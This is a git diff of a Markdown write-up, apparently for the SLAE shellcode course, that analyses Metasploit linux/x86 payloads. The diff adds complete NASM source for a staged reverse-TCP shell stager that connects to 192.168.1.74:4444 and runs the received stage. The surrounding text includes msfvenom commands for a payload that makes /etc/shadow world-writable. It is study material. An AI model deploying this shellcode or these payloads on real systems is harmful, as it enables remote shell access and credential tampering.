@@ -4,7 +4,7 @@ This MD file has been created for the SecurityTube Linux Assembly Expert certifi
 
 # Tools installation
 
-##ndisasm
+## ndisasm
 
 *ndisasm* is included in *nasm* pacakge.
 
@@ -13,7 +13,7 @@ $ apt-cache search ndisasm
 nasm - General-purpose x86 assembler
 ```
 
-##libemu
+## libemu
 
 ```
 sudo apt-get install git autoconf libtool
@@ -105,7 +105,7 @@ Description:
 [...]
 ```
 
-## Payload
+## Payload
 
 ```
 # msfvenom -p linux/x86/chmod FILE=/etc/shadow MODE=0666 -b \x00 -f c
@@ -186,7 +186,7 @@ At the end, the exit syscall is called.
 
 # linux/x86/exec without Null bytes
 
-## Payload options
+## Payload options
 ```
 # msfvenom -p linux/x86/exec --list-options
 Options for payload/linux/x86/exec:
@@ -212,7 +212,7 @@ CMD                    yes       The command string to execute
 Description:
   Execute an arbitrary command
 ```
-## Payload
+## Payload
 ```
 # # msfvenom -p linux/x86/exec CMD=/bin/ls -b \x00 R |ndisasm -u -
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -317,11 +317,11 @@ int execve (
 ) =  0;
 ```
 
-# linux/x86/shell/reverse_tcp
+# linux/x86/shell/reverse_tcp
 
 In metasploit, payloads like *OS/ARCH/shell/something* are staged payloads while *OS/ARCH/shell_something* are stagedless payloads. Let's analyse a stagged payload. In order to no complicate the analysis of every stage, null byte will not be removed.
 
-##Payload options
+## Payload options
 
 ```
 # msfvenom -p linux/x86/shell/reverse_tcp --list-options
@@ -386,7 +386,7 @@ Payload size: 68 bytes
 
 We can notice that the stageless payload has the same size for both cases.
 
-## Payload
+## Payload
 
 Let's generate the assembly code:
 
@@ -461,7 +461,72 @@ Payload size: 123 bytes
 This code can be easily turned into a NASM code.
 
 ```ASM
+global _start			
 
+section .text
+_start:
+	push byte +0xa
+	pop esi
+begin:
+	xor ebx,ebx
+	mul ebx
+	push ebx
+	inc ebx
+	push ebx
+	push byte +0x2
+	mov al,0x66
+	mov ecx,esp
+	int 0x80
+	xchg eax,edi
+	pop ebx
+	push dword 0x4a01a8c0
+	push dword 0x5c110002
+	mov ecx,esp
+	push byte +0x66
+	pop eax
+	push eax
+	push ecx
+	push edi
+	mov ecx,esp
+	inc ebx
+	int 0x80
+	test eax,eax
+	jns middle
+	dec esi
+	jz end
+	push dword 0xa2
+	pop eax
+	push byte +0x0
+	push byte +0x5
+	mov ebx,esp
+	xor ecx,ecx
+	int 0x80
+	test eax,eax
+	jns begin
+	jmp end
+middle:
+	mov dl,0x7
+	mov ecx,0x1000
+	mov ebx,esp
+	shr ebx,byte 0xc
+	shl ebx,byte 0xc
+	mov al,0x7d
+	int 0x80
+	test eax,eax
+	js end
+	pop ebx
+	mov ecx,esp
+	cdq
+	mov dl,0x24
+	mov al,0x3
+	int 0x80
+	test eax,eax
+	js end
+	jmp ecx
+end:
+	mov eax,0x1
+	mov ebx,0x1
+	int 0x80
 ```
 
 Let's check if the compiled shellcode is working:
@@ -485,7 +550,7 @@ exit
 [*] 192.168.1.138 - Command shell session 1 closed.
 ```
 
-## Analysis
+## Analysis
 
 Let's analyse this deeper. Wireshark is running on the attacker system in order to intercept all the trafic. Using gbd we can easily view that */bin/dash* is started in a new process.
 
@@ -499,7 +564,7 @@ process 2691 is executing new program: /bin/dash
 
 Running *strace* is very interesting:
 ```
-cervoise@slae:~/exam/msf$ strace ./staged-shellcode
+$ strace ./staged-shellcode
 execve("./staged-shellcode", ["./staged-shellcode"], [/* 35 vars */]) = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.1.74")}, 102) = 0
@@ -570,7 +635,7 @@ The Wireshark capture confirms this:
 
 ![ls is sent](./Exo5-images/staged2.png)
 
-##Conclusion
+## Conclusion
 
 This was a quick analysis but we understood that this payload is:
  * connection back
